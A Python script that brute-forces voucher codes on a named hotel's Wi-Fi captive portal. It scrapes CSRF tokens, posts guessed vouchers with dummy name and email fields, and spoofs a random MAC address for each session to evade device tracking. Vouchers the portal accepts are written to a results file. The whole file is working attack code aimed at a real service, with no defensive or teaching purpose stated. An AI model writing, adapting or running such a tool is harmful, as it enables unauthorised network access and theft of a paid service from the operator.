import email
import logging
import random
import re
import time
from pathlib import Path

import getmac
import requests


log = logging.getLogger(__name__)


class Session:
    UPDATE_SECS = 60 * 3

    def __init__(self, mac_address: str = None) -> None:
        self.session = requests.Session()
        self.mac_address = mac_address or self._random_mac_address()
        self.csrf_token = None
        self.csrf_token_ts = None
        log.info(f"Mac address: {self.mac_address}")

    def login(self, password: str) -> None:
        self._update_csrf_token()
        log.debug(f"checking {self.csrf_token=} {password=} mac={self.mac_address}")
        headers_str = """Host: loceanicahotel.artinwifi.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 232
Origin: https://loceanicahotel.artinwifi.com
Connection: keep-alive
Referer: https://loceanicahotel.artinwifi.com/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Pragma: no-cache
Cache-Control: no-cache"""

        headers = email.message_from_string(headers_str)

        data = f"csrf_token={self.csrf_token}&redirect_override=&element_2962_namesurname_value=xxx+xxx&element_2963_email_value=xxx%40google.com&element_2964_voucher_value={password}&element_2965_checkbox_value=1&next="
        resp = self.session.post("https://loceanicahotel.artinwifi.com/login", headers=headers, data=data)
        resp.raise_for_status()
        if "Password Not Valid!" not in resp.text:
            result = f"Got password: {self.csrf_token=} {password=} mac={self.mac_address}"
            log.warning(result)
            with Path("results.txt").open("a") as fp:
                fp.write(f"{result}\n")
            self.mac_address = self._random_mac_address()
            self._update_csrf_token()

    def _random_mac_address(self) -> str:
        population = "0123456789abcdef"
        parts = ("".join(random.choices(population=population, k=2)) for i in range(6))
        return ":".join(parts)

    def _update_csrf_token(self):
        if self.csrf_token_ts is not None and self.csrf_token_ts + self.UPDATE_SECS > time.time():
            return
        log.info(f"Updating csrf token")
        headers_str = """Host: loceanicahotel.artinwifi.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Pragma: no-cache
Cache-Control: no-cache"""

        headers = email.message_from_string(headers_str)
        url = f"https://loceanicahotel.artinwifi.com/?ssid=loceanicahotel.artinwifi&id={self.mac_address}&ip=172.16.8.242&username=&url=http://detectportal.firefox.com/canonical.html&ap=loceanicahotel.artinwifi&link-login-only=http://loceanicahotel.artinwifi/login"
        resp = self.session.get(url=url, headers=headers)
        resp.raise_for_status()
        csrf_token = re.search('name="csrf_token" value="(.+?)"/>', resp.text).group(1)
        log.info(f"Got {csrf_token=}")
        self.csrf_token = csrf_token
        self.csrf_token_ts = time.time()
